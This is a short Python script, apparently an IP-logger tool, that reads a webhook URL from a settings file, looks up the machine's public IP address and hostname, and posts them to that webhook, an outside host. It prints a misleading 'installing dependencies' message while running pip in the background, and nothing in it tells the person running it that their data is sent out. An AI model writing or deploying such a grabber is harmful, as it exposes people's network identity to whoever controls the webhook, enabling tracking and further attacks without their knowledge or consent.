import socket
import requests
import os
import json

print('installing dependencies..')
os.system('pip install requests >nul')

def get_public_ip():
    response = requests.get('https://api.ipify.org')
    return response.text.strip()

with open("loggersettings.json", "r") as f:
    data = json.load(f)




webhook_url = data['Url']
message = 'Ip from ' + socket.gethostname() +  ': ' + get_public_ip()

payload = {"content": message}
headers = {"Content-Type": "application/json"}

response = requests.post(webhook_url, json=payload, headers=headers)

if response.status_code == 204:
    print("Message sent successfully!")
else:
    print(f"Failed to send message: {response.text}")



